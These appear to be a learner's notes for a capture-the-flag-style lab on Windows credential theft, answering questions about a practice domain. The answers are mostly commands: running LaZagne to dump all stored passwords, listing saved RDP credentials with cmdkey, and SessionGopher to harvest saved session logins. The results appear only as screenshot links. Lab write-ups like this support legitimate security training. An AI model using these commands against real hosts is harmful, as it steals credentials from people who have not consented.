# [Further Credential Theft](Further%20Credential%20Theft.md)
### Using the techniques covered in this section, retrieve the sa password for the SQL01.inlanefreight.local user account.

```cmd
.\lazagne.exe all
```
![](Screenshot%202026-08-24%20at%2009.46.09.png)
### Which user has credentials stored for RDP access to the WEB01 host?

```cmd
cmdkey /list
```
![](Screenshot%202026-08-24%20at%2010.06.48.png)
### Find and submit the password for the root user to access https://vc01.inlanefreight.local/ui/login


### Enumerate the host and find the password for ftp.ilfreight.local

```powershell
PS C:\htb> Import-Module .\SessionGopher.ps1
 
PS C:\Tools> Invoke-SessionGopher -Target WINLPE-SRV01
```
![](Screenshot%202026-08-24%20at%2010.11.22.png)